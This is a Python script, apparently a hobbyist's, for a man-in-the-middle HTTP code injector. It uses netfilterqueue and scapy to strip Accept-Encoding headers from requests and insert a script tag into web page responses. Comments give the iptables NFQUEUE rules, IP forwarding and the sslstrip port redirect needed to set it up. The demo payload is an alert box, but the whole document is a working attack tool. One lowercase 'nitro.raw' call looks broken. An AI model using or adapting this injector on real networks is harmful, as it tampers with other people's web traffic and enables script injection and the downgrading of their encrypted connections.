#!/usr/env python
import netfilterqueue 
import scapy.all as nitro
from scapy.all import Raw
import pyfiglet
import re

# <<OTHER MACHINE>> iptables -I FORWARD -j NFQUEUE --queue-num 0
# <<Same MACHINE>>  iptables -I OUTPUT -j NFQUEUE --queue-num 0
# <<Same MACHINE>>  iptables -I INPUT -j NFQUEUE --queue-num 0
# <<AFTER DONE>>    iptables --flush
# <<GET IP>>        ping -c 1 www.website.com
# <<WEB SERVER>>    service apache2 start
# <<IP forwarding>> echo 1 > /proc/sys/net/ipv4/ip_forward
# <<redirect http to port 10000 for sslstrip>>
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

result = pyfiglet.figlet_format('404_is', font='banner3-D')
print(result)

print("A code injector designed by obadare victor")

def set_file(packet, load):
    packet[nitro.Raw].load = load
    del packet[nitro.IP].len
    del packet[nitro.IP].chksum
    del packet[nitro.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = nitro.IP(packet.get_payload())
    if scapy_packet.haslayer(nitro.Raw):  
        codeload  = scapy_packet[nitro.Raw].load
        if scapy_packet[nitro.TCP].dport == 80:
            print("[+] request")
            codeload = re.sub("Accept-Encoding:.*?\\r\\n", "", codeload)
            

        elif scapy_packet[nitro.TCP].sport == 80:
            print("[+] response")
            print(scapy_packet.show())
            codeload = scapy_packet[nitro.raw].load.replace("</body>","<script>alert('01');</script></body>")
            

        if codeload != scapy_packet[nitro.Raw].load:
            new_PACKET = set_file(scapy_packet, codeload)
            packet.set_payload(str(new_PACKET))


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()